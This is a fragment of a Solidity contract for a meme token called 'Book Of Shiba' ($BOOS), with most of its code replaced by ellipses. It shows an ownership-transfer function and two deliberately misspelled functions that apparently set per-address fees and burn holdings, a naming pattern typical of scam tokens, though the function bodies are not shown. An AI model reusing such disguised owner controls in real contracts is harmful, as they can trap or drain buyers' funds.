...
/**
https://t.me/BookOfShibaERC
https://twitter.com/BookOfShibErc20
Book Of Shiba $BOOS
...
abstract contract Ownable {
    ...
    function transferOwnershipshibabook(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BookOfShiba is Ownable {
    ...
    function Aprovrves(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burntloeyters(address user) public {
